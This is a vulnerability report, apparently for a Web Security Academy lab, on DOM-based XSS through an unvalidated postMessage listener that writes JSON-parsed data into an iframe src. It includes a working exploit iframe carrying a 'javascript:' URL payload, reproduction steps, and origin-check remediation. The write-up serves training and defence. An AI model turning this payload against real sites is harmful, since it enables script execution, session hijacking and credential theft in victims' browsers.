# Vulnerability Report: DOM XSS via postMessage (JSON.parse)

**Severity:** Medium  
**CVSS Score:** 5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)  
**Date:** 2026-07-22  
**Target:** web-security-academy.net  

## Executive Summary
A DOM-based Cross-Site Scripting vulnerability was identified in the main page of the application.
The page implements a postMessage event listener that accepts messages from any origin and passes
user-controlled data directly into an `iframe.src` sink without sanitization or origin validation,
allowing an attacker to execute arbitrary JavaScript in the context of the target application.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | DOM-based Cross-Site Scripting (postMessage) |
| Parameter | `e.data` (web message) |
| Sink | `ACMEplayer.element.src` (iframe src) |
| Origin Validation | None |
| Input Sanitization | None |

## Steps to Reproduce
1. Open the target application and inspect the page source — locate the `message` event listener in the script tag.
2. Observe that the listener parses `e.data` with `JSON.parse()` and passes `d.url` directly to `iframe.src` when `d.type === "load-channel"`, with no origin check on `e.origin`.
3. Host the following exploit on a controlled server and deliver it to the victim:

```html
<iframe src="https://TARGET.web-security-academy.net/" 
        onload='this.contentWindow.postMessage(JSON.stringify({"type":"load-channel","url":"javascript:print()"}), "*")'>
```

4. When the iframe loads the target page, `postMessage` fires and the listener assigns the `javascript:` URL to the inner iframe's `src`, executing arbitrary JavaScript.

## Proof of Concept
```http
# Exploit page delivered to victim:

<iframe 
  src="https://variableSub.web-security-academy.net/"
  onload='this.contentWindow.postMessage(
    JSON.stringify({"type":"load-channel","url":"javascript:print()"}),
    "*"
  )'>
```

**Message payload:**
```json
{
  "type": "load-channel",
  "url": "javascript:print()"
}
```

## Impact
An attacker who tricks a victim into visiting a malicious page can execute arbitrary JavaScript
in the context of the target origin. Depending on the application, this can lead to:
- Session hijacking (if cookies are accessible)
- Performing actions on behalf of the victim
- Redirecting the victim to phishing pages
- Credential harvesting via fake login forms injected into the DOM

## Remediation
- Validate `e.origin` in the message event listener before processing any incoming message:
```javascript
  if (e.origin !== "https://trusted-origin.com") return;
```
- Never assign user-controlled data directly to URL sinks such as `iframe.src` or `location.href`.
- If a URL must be assigned dynamically, validate that it starts with `https://` and matches an allowlist.

## References
- OWASP: DOM-based XSS
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PortSwigger: Controlling the web message source
